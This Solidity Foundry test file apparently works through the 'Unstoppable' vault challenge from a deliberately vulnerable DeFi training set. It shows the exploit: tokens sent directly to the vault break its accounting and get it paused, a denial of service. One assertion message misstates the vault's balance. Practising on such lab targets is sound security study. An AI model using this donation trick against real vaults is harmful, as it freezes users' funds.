pragma solidity ^0.8.13;

import { Test, console } from 'forge-std/Test.sol';
import { UnstoppableVault } from '../src/UnstoppableVault.sol';
import { UnstoppableMonitor } from '../src/UnstoppableMonitor.sol';
import { ERC20 } from '@solmate/src/tokens/ERC4626.sol';

contract DVTToken is ERC20 {
  constructor(address owner, uint256 initialSupply) ERC20('Too Damn Valuable Token', 'DVT', 18) {
    _mint(owner, initialSupply);
  }
}

contract UnstoppableTest is Test {
  UnstoppableVault public vault;
  UnstoppableMonitor public monitor;

  uint256 public constant DVT_INITIAL_SUPPLY = 1_000_010e18;
  DVTToken public dvt;

  address public OWNER = makeAddr('OWNER');
  address public FEE_RECIPIENT = makeAddr('FEE_RECIPIENT');

  function setUp() public {
    OWNER = makeAddr('OWNER');
    FEE_RECIPIENT = makeAddr('FEE_RECIPIENT');

    dvt = new DVTToken(OWNER, DVT_INITIAL_SUPPLY);
    vault = new UnstoppableVault(dvt, OWNER, FEE_RECIPIENT);
    monitor = new UnstoppableMonitor(address(vault));

    vm.startPrank(OWNER);
    dvt.approve(address(vault), 1_000_000e18);
    vault.deposit(1_000_000e18, OWNER);
    dvt.transfer(address(this), 10e18);
    vault.transferOwnership(address(monitor));
    vm.stopPrank();
  }

  function testCheckFlashLoan() public {
    uint256 balance = dvt.balanceOf(address(this));
    uint256 balanceVault = dvt.balanceOf(address(vault));

    uint256 ASSET_TOTAL_VAULT = vault.totalAssets() / 1e18;
    uint256 OWNER_SHARES = vault.balanceOf(OWNER) / 1e18;

    console.log('--------------------------------');
    console.log('ASSET_TOTAL_VAULT', ASSET_TOTAL_VAULT);
    console.log('OWNER_SHARES', OWNER_SHARES);
    console.log('--------------------------------');

    assertEq(balance, 10e18, 'Address this should have 10 DVT');
    assertEq(balanceVault, DVT_INITIAL_SUPPLY - 10e18, 'Vault should have 990 DVT');

    dvt.transfer(address(vault), 5e18);
    monitor.checkFlashLoan(1);
    assertEq(vault.paused(), true, 'DVT should be paused');

    console.log('1_ATTEMPT_TO_FLASH_LOAN_AGAIN');
    monitor.checkFlashLoan(1);
    console.log('2_ATTEMPT_TO_FLASH_LOAN_AGAIN');
  }
}
